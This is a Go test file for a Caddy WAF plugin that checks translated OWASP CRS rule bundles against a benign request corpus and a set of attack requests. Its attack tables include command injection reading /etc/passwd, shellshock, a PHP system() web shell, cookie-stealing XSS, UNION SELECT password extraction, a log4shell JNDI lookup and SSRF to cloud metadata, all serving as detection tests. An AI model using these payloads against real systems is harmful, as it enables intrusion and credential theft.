package caddywaf

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/caddyserver/caddy/v2/modules/caddyhttp"
	"github.com/phemmer/go-iptrie"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
)

// The rules/crs/ bundles are generated from the OWASP Core Rule Set by
// get_owasp_rules.py. They are opt-in and every rule is action "log", so on a
// default configuration they only contribute advisory score. These tests load
// the paranoia-level-1 bundle the way a CRS-style deployment would --
// log_scores_block with the CRS threshold of 5 -- and check that ordinary
// browser traffic still passes while textbook attacks are blocked. Every case
// in the benign corpus below is a request shape that a raw-body regex WAF is
// prone to false-positive on (multipart framing, JSON syntax, YAML, cookies).

const (
	crsPL1Bundle         = "rules/crs/crs-pl1.json"
	crsPL1ResponseBundle = "rules/crs/crs-pl1-response.json"
)

// crsTargets lists every target name the extractor resolves (request.go), so a
// generated bundle cannot ship a target that is silently skipped at runtime.
var crsTargetPrefixes = []string{"HEADERS:", "RESPONSE_HEADERS:", "COOKIES:", "URL_PARAM:", "JSON_PATH:"}
var crsStaticTargets = map[string]bool{
	"METHOD": true, "REMOTE_IP": true, "PROTOCOL": true, "HOST": true, "ARGS": true,
	"USER_AGENT": true, "PATH": true, "URI": true, "BODY": true, "HEADERS": true,
	"RESPONSE_HEADERS": true, "RESPONSE_BODY": true, "FILE_NAME": true,
	"FILE_MIME_TYPE": true, "COOKIES": true, "CONTENT_TYPE": true, "URL": true,
}

func crsBundles(t *testing.T) []string {
	t.Helper()
	bundles, err := filepath.Glob("rules/crs/*.json")
	require.NoError(t, err)
	require.NotEmpty(t, bundles, "expected generated CRS bundles under rules/crs/")
	return bundles
}

// TestCRSBundlesAreLoadable compiles every generated pattern under RE2, rejects
// duplicate IDs across all paranoia levels, and checks that each rule uses a
// target the extractor knows, an explicit transformation chain, and a
// severity-derived score (the invariants the translator promises).
func TestCRSBundlesAreLoadable(t *testing.T) {
	seen := map[string]string{}
	for _, path := range crsBundles(t) {
		rules := loadRuleFile(t, path)
		require.NotEmptyf(t, rules, "%s must not be empty", path)
		for _, r := range rules {
			_, err := regexp.Compile(r.Pattern)
			require.NoErrorf(t, err, "%s: %s must compile under RE2", path, r.ID)
			require.Truef(t, strings.HasPrefix(r.ID, "crs-"), "%s: %s must carry the crs- prefix", path, r.ID)
			if prev, dup := seen[r.ID]; dup {
				t.Fatalf("%s: rule %s is also defined in %s", path, r.ID, prev)
			}
			seen[r.ID] = path
			require.Equalf(t, "log", r.Action, "%s: %s must be a log rule", path, r.ID)
			require.NotNilf(t, r.Transformations, "%s: %s must set an explicit transformations chain", path, r.ID)
			require.NoErrorf(t, validateRule(&r), "%s: %s", path, r.ID)
			require.Containsf(t, []int{2, 3, 4, 5}, r.Score, "%s: %s score must derive from a CRS severity", path, r.ID)
			for _, target := range r.Targets {
				known := crsStaticTargets[target]
				for _, p := range crsTargetPrefixes {
					if strings.HasPrefix(target, p) && len(target) > len(p) {
						known = true
					}
				}
				require.Truef(t, known, "%s: %s uses unknown target %q", path, r.ID, target)
			}
		}
	}
}

// crsMiddleware loads the given bundles in CRS mode: log rules count towards
// the block decision and the threshold is the CRS default of 5, so a single
// CRITICAL match blocks, exactly as in a stock CRS installation.
func crsMiddleware(t *testing.T, files ...string) *Middleware {
	t.Helper()
	logger := zap.NewNop()
	m := &Middleware{
		logger: logger, blacklistLoader: NewBlacklistLoader(logger),
		AnomalyThreshold: 5, LogScoresBlock: true,
		ruleCache: NewRuleCache(), ipBlacklist: iptrie.NewTrie(),
		dnsBlacklist: map[string]struct{}{}, ruleHitsByPhase: map[int]int64{},
		RuleFiles:             files,
		requestValueExtractor: NewRequestValueExtractor(logger, false, 0),
		provisionTime:         time.Now(), topIPsBlocked: map[string]int64{},
		blockedByReason: map[string]int64{}, geoIPStats: map[string]int64{},
	}
	require.NoError(t, m.loadRules(m.RuleFiles))
	return m
}

var crsNext = caddyhttp.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) error {
	w.WriteHeader(http.StatusOK)
	return nil
})

// crsServe runs one request and returns the status plus the rule IDs that
// fired for it, so a failing case names the rule responsible.
func crsServe(t *testing.T, m *Middleware, r *http.Request) (int, []string) {
	t.Helper()
	before := crsHitSnapshot(m)
	r.RemoteAddr = "203.0.113.9:1234"
	rec := httptest.NewRecorder()
	_ = m.ServeHTTP(rec, r, crsNext)
	after := crsHitSnapshot(m)
	var fired []string
	for id, n := range after {
		if n > before[id] {
			fired = append(fired, id)
		}
	}
	sort.Strings(fired)
	return rec.Code, fired
}

func crsHitSnapshot(m *Middleware) map[string]int64 {
	out := map[string]int64{}
	m.ruleHits.Range(func(k, v interface{}) bool {
		out[string(k.(RuleID))] = v.(*atomic.Int64).Load()
		return true
	})
	return out
}

func crsGet(path, query string, headers ...string) *http.Request {
	r := httptest.NewRequest("GET", path, nil)
	if query != "" {
		r.URL.RawQuery = query
		r.RequestURI = path + "?" + query
	}
	for i := 0; i+1 < len(headers); i += 2 {
		r.Header.Set(headers[i], headers[i+1])
	}
	return r
}

func crsPost(path, contentType, body string, headers ...string) *http.Request {
	r := httptest.NewRequest("POST", path, strings.NewReader(body))
	r.Header.Set("Content-Type", contentType)
	for i := 0; i+1 < len(headers); i += 2 {
		r.Header.Set(headers[i], headers[i+1])
	}
	return r
}

var crsBenignCorpus = []struct {
	name string
	r    func() *http.Request
}{
	{"encoded query value", func() *http.Request { return crsGet("/s", "q=hello%20world") }},
	{"navigation with Referer", func() *http.Request {
		return crsGet("/p", "", "Referer", "https://www.google.com/search?q=caddy", "User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36")
	}},
	{"JSON body with common fields", func() *http.Request {
		return crsPost("/api", "application/json", `{"count":3,"user":"alice","data":{"list":[1,2]},"select":"name","from":"2024-01-01"}`)
	}},
	{"English prose body", func() *http.Request {
		return crsPost("/c", "application/x-www-form-urlencoded", "comment=please+select+an+item+from+the+list%2C+don%27t+forget+to+set+a+date+and+update+where+needed")
	}},
	{"legit GraphQL query", func() *http.Request {
		return crsPost("/graphql", "application/json", `{"query":"query { user(id: 1) { name email version } }"}`)
	}},
	{"login page", func() *http.Request { return crsGet("/login", "") }},
	{"multipart upload", func() *http.Request {
		b := "------WebKitFormBoundaryX\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nhi\r\n------WebKitFormBoundaryX--\r\n"
		return crsPost("/u", "multipart/form-data; boundary=----WebKitFormBoundaryX", b)
	}},
	{"CSS custom properties in body", func() *http.Request {
		return crsPost("/s", "application/x-www-form-urlencoded", "css=--main-color%3A+%23fff%3B+padding%3A+10px")
	}},
	{"pagination limit param", func() *http.Request { return crsGet("/items", "limit=20&offset=40") }},
	{"framework array params", func() *http.Request {
		return crsGet("/search", "filter[status]=open&filter[tag]=urgent&sort[]=date")
	}},
	{"YAML config body", func() *http.Request {
		return crsPost("/config", "application/yaml", "data: 42\nname: my-service\nversion: 1.2.3\n")
	}},
	{"cookie named id + user", func() *http.Request {
		return crsGet("/home", "", "Cookie", "session=abc; id=42; user=alice")
	}},
	{"cross-site POST with Origin", func() *http.Request {
		return crsPost("/api/submit", "application/x-www-form-urlencoded", "a=1", "Origin", "https://partner.example.com", "Referer", "https://partner.example.com/checkout")
	}},
	{"explicit Content-Length 0", func() *http.Request {
		r := httptest.NewRequest("POST", "/ping", nil)
		r.Header.Set("Content-Length", "0")
		return r
	}},
	{"cross-site image fetch (Sec-Fetch)", func() *http.Request {
		return crsGet("/img/logo.png", "", "User-Agent", "Mozilla/5.0", "Sec-Fetch-Mode", "no-cors", "Sec-Fetch-Site", "cross-site", "Sec-Fetch-Dest", "image")
	}},
	{"OAuth redirect_uri param", func() *http.Request {
		return crsGet("/authorize", "redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb&state=xyz")
	}},
	{"SPA config fetch", func() *http.Request { return crsGet("/assets/config.json", "") }},
	{"bearer JWT", func() *http.Request {
		return crsGet("/api/me", "", "Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.dGVzdHNpZ25hdHVyZQ")
	}},
	{"CI YAML body with template syntax", func() *http.Request {
		return crsPost("/api/pipelines", "application/yaml", "data: 42\nrun: echo \"${{ inputs.name }}\"\n")
	}},
	{"markdown comment body", func() *http.Request {
		return crsPost("/comments", "application/json", `{"body":"Great post! See https://example.com/docs#section-2 and the *README*.","author":"bob"}`)
	}},
	{"search with quotes and apostrophe", func() *http.Request {
		return crsGet("/search", "q=%22rock+n%27+roll%22+albums+from+the+70s")
	}},
	{"file download path", func() *http.Request { return crsGet("/files/report-2024.pdf", "") }},
	{"date range filter", func() *http.Request {
		return crsGet("/report", "from=2024-01-01&to=2024-12-31&group=month")
	}},
	{"HTML form with email and phone", func() *http.Request {
		return crsPost("/signup", "application/x-www-form-urlencoded", "email=alice%40example.com&phone=%2B1+555-0100&name=Alice+O%27Brien")
	}},
	{"websocket-ish polling cache buster", func() *http.Request {
		return crsGet("/socket.io/", "EIO=4&transport=polling&t=N8x0.10")
	}},
	{"JSON with nested numbers and booleans", func() *http.Request {
		return crsPost("/api/settings", "application/json", `{"theme":"dark","notifications":true,"limits":{"daily":100,"monthly":2500},"tags":["a","b"]}`)
	}},
	{"Windows browser User-Agent", func() *http.Request {
		return crsGet("/", "", "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0")
	}},
	{"Accept-Language and charset headers", func() *http.Request {
		return crsGet("/", "", "Accept-Language", "en-US,en;q=0.9,de;q=0.8", "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Charset", "utf-8, iso-8859-1;q=0.5")
	}},
}

// TestCRSPL1NoBrowserFalsePositives loads only the PL1 bundle in CRS mode and
// asserts that every benign request passes. On failure the message names the
// rules that fired so the translator's exclusion list can be updated.
func TestCRSPL1NoBrowserFalsePositives(t *testing.T) {
	m := crsMiddleware(t, crsPL1Bundle)
	for _, c := range crsBenignCorpus {
		t.Run(c.name, func(t *testing.T) {
			code, fired := crsServe(t, m, c.r())
			assert.NotEqualf(t, http.StatusForbidden, code, "benign request blocked by %v", fired)
			if len(fired) > 0 {
				t.Logf("advisory hits: %v", fired)
			}
		})
	}
}

// TestCRSPL1BlocksTextbookAttacks pins the coverage the PL1 bundle adds: in
// CRS mode each request must be blocked. Evaluation stops at the first rule
// that crosses the threshold, so this test only asserts that some CRS rule
// fired; TestCRSPL1RuleCoverage pins which rule catches which payload.
func TestCRSPL1BlocksTextbookAttacks(t *testing.T) {
	m := crsMiddleware(t, crsPL1Bundle)
	cases := []struct {
		name string
		r    func() *http.Request
	}{
		{"scanner User-Agent", func() *http.Request {
			return crsGet("/", "", "User-Agent", "sqlmap/1.8#stable (https://sqlmap.org)")
		}},
		{"path traversal", func() *http.Request { return crsGet("/download", "file=../../etc/passwd") }},
		{"OS file access", func() *http.Request { return crsGet("/view", "f=/etc/shadow") }},
		{"restricted file on path", func() *http.Request { return crsGet("/.git/config", "") }},
		{"RFI with IP URL parameter", func() *http.Request { return crsGet("/index.php", "page=http://203.0.113.5/shell.txt") }},
		{"unix command injection", func() *http.Request { return crsGet("/ping", "host=127.0.0.1;cat /etc/passwd") }},
		{"pipe to ls", func() *http.Request { return crsGet("/ping", "host=a| ls -la") }},
		{"shellshock in User-Agent", func() *http.Request {
			return crsGet("/cgi-bin/x", "", "User-Agent", "() { :; }; /bin/bash -c 'id'")
		}},
		{"PHP open tag in body", func() *http.Request {
			return crsPost("/upload", "application/x-www-form-urlencoded", "content=%3C%3Fphp+system%28%24_GET%5Bc%5D%29%3B+%3F%3E")
		}},
		{"PHP high-risk function", func() *http.Request { return crsGet("/x", "cmd=shell_exec('ls')") }},
		{"script tag XSS", func() *http.Request { return crsGet("/s", "q=<script>alert(1)</script>") }},
		{"javascript URI XSS", func() *http.Request { return crsGet("/s", "u=javascript:alert(document.cookie)") }},
		{"event-handler XSS", func() *http.Request { return crsGet("/s", "q=<img src=x onerror=alert(1)>") }},
		{"SQLi sleep()", func() *http.Request { return crsGet("/item", "id=1 AND sleep(5)") }},
		{"SQLi UNION SELECT", func() *http.Request {
			return crsGet("/s", "id=1 UNION SELECT username, password FROM users")
		}},
		{"SQLi information_schema", func() *http.Request {
			return crsGet("/s", "id=1' and 1=(select count(*) from information_schema.tables)--")
		}},
		{"MongoDB operator injection", func() *http.Request {
			return crsPost("/login", "application/x-www-form-urlencoded", "user[$ne]=1&pass[$ne]=1")
		}},
		{"session fixation", func() *http.Request {
			return crsGet("/", "s=document.cookie=\"PHPSESSID=abc; domain=.example.com\"")
		}},
		{"log4shell JNDI in header", func() *http.Request {
			return crsGet("/", "", "X-Api-Version", "${jndi:ldap://203.0.113.5/a}")
		}},
		{"Java Runtime.exec in body", func() *http.Request {
			return crsPost("/api", "application/json", `{"x":"java.lang.Runtime.getRuntime().exec(\"id\")"}`)
		}},
		{"prototype pollution", func() *http.Request {
			return crsPost("/api", "application/json", `{"__proto__":{"admin":true}}`)
		}},
		{"SSRF to cloud metadata", func() *http.Request { return crsGet("/fetch", "url=http://169.254.169.254/latest/meta-data/") }},
		{"header injection in query", func() *http.Request { return crsGet("/r", "next=%2Fhome%0D%0ASet-Cookie%3A+x%3D1") }},
		{"integer overflow value", func() *http.Request { return crsGet("/r", "page=1&n=4294967296") }},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			code, fired := crsServe(t, m, c.r())
			assert.Equalf(t, http.StatusForbidden, code, "attack must be blocked in CRS mode; rules fired: %v", fired)
			assert.NotEmpty(t, fired, "a CRS rule must be recorded as the hit")
		})
	}
}

// TestCRSPL1RuleCoverage checks individual translated patterns at the regex
// level. It does not run the transformation chain: each payload is written
// by hand in the form the chain would produce (already percent-decoded, and
// lower-cased for the rules whose chain includes lowercase, e.g. 944100). It
// pins that the translation preserved each rule's detection, including the
// anchor relaxation for values that are not first in the query string.
func TestCRSPL1RuleCoverage(t *testing.T) {
	byID := map[string]*regexp.Regexp{}
	for _, path := range []string{crsPL1Bundle, crsPL1ResponseBundle} {
		for _, r := range loadRuleFile(t, path) {
			byID[r.ID] = regexp.MustCompile(r.Pattern)
		}
	}
	cases := []struct {
		rule    string
		payload string
	}{
		{"crs-913100", "Mozilla/5.0 (compatible; Nikto/2.1.6)"},
		{"crs-920350", "203.0.113.9:8080"},
		{"crs-920500", "/var/www/index.php~"},
		{"crs-921150", "next=/home\r\nSet-Cookie: x=1"},
		{"crs-930100", "file=..%2F..%2Fetc%2Fpasswd"},
		{"crs-930120", "f=/etc/shadow"},
		{"crs-930130", "/.git/config"},
		{"crs-931100", "a=1&page=http://203.0.113.5/shell.txt"},
		{"crs-932160", "host=127.0.0.1;cat /etc/passwd"},
		{"crs-932170", "User-Agent: () { :; }; /bin/bash -c 'id'"},
		{"crs-932230", "x=a| ls -la"},
		{"crs-933100", "content=<?php system($_GET[c]); ?>"},
		{"crs-933150", "cmd=shell_exec('ls')"},
		{"crs-941110", "q=<script>alert(1)</script>"},
		{"crs-941160", "q=<img src=x onerror=alert(1)>"},
		{"crs-941170", "u=javascript:alert(document.cookie)"},
		{"crs-942160", "id=1 AND sleep(5)"},
		{"crs-942190", "id=1 UNION SELECT username, password FROM users"},
		{"crs-942220", "page=1&n=4294967296"},
		{"crs-942290", "user[$ne]=1"},
		{"crs-943100", `s=document.cookie="PHPSESSID=abc; domain=.example.com"`},
		{"crs-944100", `{"x":"java.lang.runtime.getruntime().exec(\"id\")"}`},
		{"crs-944150", "X-Api-Version: ${jndi:ldap://203.0.113.5/a}"},
		{"crs-934130", `{"__proto__":{"admin":true}}`},
		{"crs-934110", "url=http://169.254.169.254/latest/meta-data/"},
		{"crs-951230", "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"},
		{"crs-955100", "<h1>Ajax/PHP Command Shell</h1>"},
	}
	for _, c := range cases {
		re, ok := byID[c.rule]
		require.Truef(t, ok, "%s must be in the PL1 bundle", c.rule)
		assert.Truef(t, re.MatchString(c.payload), "%s must match %q", c.rule, c.payload)
	}
}

// TestCRSPL1KnownGaps documents what the port cannot catch on its own: CRS
// detects the classic quote tautology at PL1 with libinjection (@detectSQLi),
// which has no regex equivalent, so the PL1 bundle alone lets it through. The
// shipped rules.json covers it, which is why the bundle is documented as a
// complement to rules.json, not a replacement.
func TestCRSPL1KnownGaps(t *testing.T) {
	tautology := func() *http.Request { return crsGet("/login", "user=admin' OR 1=1--") }
	crsOnly := crsMiddleware(t, crsPL1Bundle)
	code, fired := crsServe(t, crsOnly, tautology())
	assert.NotEqual(t, http.StatusForbidden, code, "PL1 alone does not port @detectSQLi; fired: %v", fired)

	withDefaults := crsMiddleware(t, "rules.json", crsPL1Bundle)
	code, _ = crsServe(t, withDefaults, tautology())
	assert.Equal(t, http.StatusForbidden, code, "rules.json + PL1 must block the tautology")
}

// BenchmarkCRSPL1BenignPOST measures the per-request cost of the PL1 bundle on
// a benign JSON POST (the @pmFromFile rules compile to multi-kilobyte
// alternations, so this is the number to watch when regenerating).
func BenchmarkCRSPL1BenignPOST(b *testing.B) {
	logger := zap.NewNop()
	m := &Middleware{
		logger: logger, blacklistLoader: NewBlacklistLoader(logger),
		AnomalyThreshold: 5, LogScoresBlock: true,
		ruleCache: NewRuleCache(), ipBlacklist: iptrie.NewTrie(),
		dnsBlacklist: map[string]struct{}{}, ruleHitsByPhase: map[int]int64{},
		RuleFiles:             []string{crsPL1Bundle},
		requestValueExtractor: NewRequestValueExtractor(logger, false, 0),
		provisionTime:         time.Now(), topIPsBlocked: map[string]int64{},
		blockedByReason: map[string]int64{}, geoIPStats: map[string]int64{},
	}
	if err := m.loadRules(m.RuleFiles); err != nil {
		b.Fatal(err)
	}
	body := `{"count":3,"user":"alice","data":{"list":[1,2],"note":"please select an item from the list and update where needed"},"tags":["a","b","c"]}`
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		r := crsPost("/api/items", "application/json", body, "User-Agent", "Mozilla/5.0", "Cookie", "session=abc; id=42")
		r.RemoteAddr = "203.0.113.9:1234"
		rec := httptest.NewRecorder()
		_ = m.ServeHTTP(rec, r, crsNext)
	}
}

// TestCRSBundlesAdvisoryByDefault checks the documented default: without
// log_scores_block, the bundle observes but never blocks, even on an attack.
func TestCRSBundlesAdvisoryByDefault(t *testing.T) {
	m := crsMiddleware(t, crsPL1Bundle)
	m.LogScoresBlock = false
	code, fired := crsServe(t, m, crsGet("/s", "q=<script>alert(1)</script>"))
	assert.NotEqual(t, http.StatusForbidden, code, "log-only bundle must not block without log_scores_block")
	assert.Contains(t, fired, "crs-941110", "the rule must still be recorded as a hit")
}

// TestCRSHigherParanoiaLevelsLoadWithPL1 loads every bundle together, which is
// how a PL2+ deployment is configured (levels are cumulative), and checks the
// combined set is consistent (no duplicate ids, all rules loaded).
func TestCRSHigherParanoiaLevelsLoadWithPL1(t *testing.T) {
	bundles := crsBundles(t)
	m := crsMiddleware(t, bundles...)
	total := 0
	for _, path := range bundles {
		total += len(loadRuleFile(t, path))
	}
	loaded := 0
	for _, rules := range m.Rules {
		loaded += len(rules)
	}
	assert.Equal(t, total, loaded, "every rule in every bundle must load")
}

// TestCRSCoverageReportMatchesBundles keeps COVERAGE.md honest: the rule
// counts it reports must equal what the bundles actually contain.
func TestCRSCoverageReportMatchesBundles(t *testing.T) {
	report, err := os.ReadFile("rules/crs/COVERAGE.md")
	require.NoError(t, err)
	for _, path := range crsBundles(t) {
		var rules []json.RawMessage
		data, err := os.ReadFile(path)
		require.NoError(t, err)
		require.NoError(t, json.Unmarshal(data, &rules))
		want := "`" + filepath.Base(path) + "`: " + strconv.Itoa(len(rules)) + " rules"
		if len(rules) == 1 {
			want = "`" + filepath.Base(path) + "`: 1 rule\n"
		}
		assert.Containsf(t, string(report), want, "COVERAGE.md must report %s", want)
	}
}
